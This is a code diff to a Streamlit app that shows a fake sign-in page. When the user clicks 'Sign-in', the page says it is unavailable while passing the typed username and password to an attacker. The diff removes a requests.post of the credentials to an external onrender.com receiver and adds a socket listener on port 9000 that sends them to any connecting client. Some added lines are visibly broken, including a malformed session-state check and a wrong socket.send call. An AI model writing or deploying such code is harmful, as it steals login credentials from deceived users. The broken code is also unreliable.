@@ -1,5 +1,15 @@
 import streamlit as st
-import requests
+import socket
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+server.bind(("0.0.0.0", 9000))
+
+server.listen()
+
+client, addr = server.accept()
+
+     
 
 username = ""
 password = ""
@@ -14,6 +24,10 @@ session_state = SessionState()
 
 left, middle, right = st.columns(3)
 
+if username & password not in st.session_state:
+        st.session_state.username = ""
+        st.session_state.password = ""
+
 
 with middle:
     image_url = "https://www.dafont.com/forum/attach/orig/8/1/815933.png?1"
@@ -25,5 +39,4 @@ with middle:
     st.write(username , password)
     if st.button("Sign-in"):
        st.write("Sorry this page is not currently Available")
-       data = {"username": username, "password": password}
-       response = requests.post("https://receiver-t4vh.onrender.com", data=data)
+       client.send(username, password.encode('utf-8'))
